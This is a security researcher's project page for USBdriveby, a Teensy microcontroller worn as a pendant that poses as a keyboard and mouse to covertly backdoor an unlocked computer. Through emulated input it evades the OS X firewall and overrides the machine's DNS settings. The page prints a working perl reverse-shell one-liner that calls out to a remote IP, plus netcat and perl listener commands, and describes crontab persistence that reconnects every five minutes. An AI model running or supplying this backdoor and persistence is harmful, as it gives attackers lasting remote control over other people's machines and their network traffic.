# [USBdriveby](http://samy.pl/usbdriveby)

**USBdriveby** is a device you stylishly wear around your neck which can quickly and covertly install a backdoor and override DNS settings on an unlocked machine via USB in a matter of seconds. It does this by emulating a keyboard and mouse, blindly typing controlled commands, flailing the mouse pointer around and weaponizing mouse clicks.

In this project, we'll learn how to exploit a system's blind trust in USB devices, and learn how a $20 Teensy microcontroller can evade various security settings on a real system, open a permanent backdoor, control the flow of network traffic, and all within a few seconds and permanently, even after the device has been removed.

by [@SamyKamkar](https://twitter.com/samykamkar) // <code@samy.pl> // <http://samy.pl> // Dec 17, 2014

Code available on [github](https://github.com/samyk/usbdriveby)

<a href="http://www.youtube.com/watch?feature=player_embedded&v=nlM2D8qCg-E
" target="_blank"><img src="http://img.youtube.com/vi/nlM2D8qCg-E/0.jpg" alt="USBdriveby" width="640" height="480" border="10" /></a>

------

# Overview

I often wear a microcontroller around my neck, and have a few for a few different fun tasks. One that's more interesting is this, USBdriveby, which emulates a keyboard and mouse when plugged into a machine, exploiting the blind trust machines give USB devices.

Specifically, when you normally plug in a mouse or keyboard into a machine, no authorization is required. The devices can simply begin typing. We exploit this fact by sending arbitrary keystrokes meant to launch specific applications, permanently evade a local firewall, install a reverse shell, and even modify DNS settings 

We even evade OS X's security - while they attempt to prevent network changes being done by just a "keyboard", and even prevent most applications from moving windows to specific locations, we evade both of these with some unprotected applescript and carefully planned mouse movements.
![http://samy.pl/usbdriveby/driveby.jpg](http://samy.pl/usbdriveby/driveby.jpg)


------

# Software

### USBdriveby
You can acquire the USBdriveby microcontroller source code from my github: <https://github.com/samyk/usbdriveby>

I've written it for both Teensy and Arduino microcontrollers, however not all Arduinos are capable of emulating a USB HID keyboard/mouse (the Arduino Nano specifically cannot).

### dns_spoofer.pl
I've created a DNS server which responds to normal DNS requests properly, however sends spoofed answers for specific hostnames. This runs on a remote host and allows us to manipulate the traffic of the system that's been hit by USBdriveby.

This is also available on my github: <https://github.com/samyk/usbdriveby>

### perl backdoor
We use a perl backdoor I developed as virtually all OS X and *nix machines have perl installed by default. You'll find many of these systems don't come with a C compiler, especially in the bare bones version, but perl is always quietly available.

``perl -MIO::Socket -e'$c=new IO::Socket::INET("72.14.179.47:1337");print$c `$_`while<$c>'``

### netcat
To evade the local router and not require any ports opening up, we produce a reverse shell by connecting out to a server we control every 5 minutes via crontab, and once the connection is established, we can begin sending commands to the compromised machine. If the connection dies, the compromised system will connect back within 5 minutes. [netcat](http://netcat.sourceforge.net/) is an easy way to support this.

`netcat -l 1337`

You could also use perl in lieu of netcat again:

``perl -MIO -e'$c=new IO::Socket::INET(LocalPort,1337,Listen)->accept;print$c $_ while <STDIN>'``

-----

# Hardware

### Teensy
**$20**: [Teensy 3.1](https://www.pjrc.com/teensy/) is an awesome USB based microcontroller. It's small, more powerful than typical Arduinos, and inexpensive. It's perfect for this project with it's small form factor, support for emulating USB devices such as HID keyboards and mice, and it looks rad.

### Chain
Get a cool chain so you can wear your USBdriveby device around as a pendant. You'll get compliments on your jewelry, but little do they know...


-----

# Emulating HID Devices

I go into the code and emulating devices in the video!

-----

# Custom DNS Server

I developed a simple DNS server which actually answers requests properly except in the case of specific hosts we wish to spoof. We can spoof them in the code or simply add them to /etc/hosts as my software spoofs anything in /etc/hosts as well.

-----

# Questions?

Feel free to contact me with any questions!

Follow [@SamyKamkar](https://twitter.com/samykamkar) on Twitter!

You can see more of my projects at <http://samy.pl> or contact me at <code@samy.pl>.


------
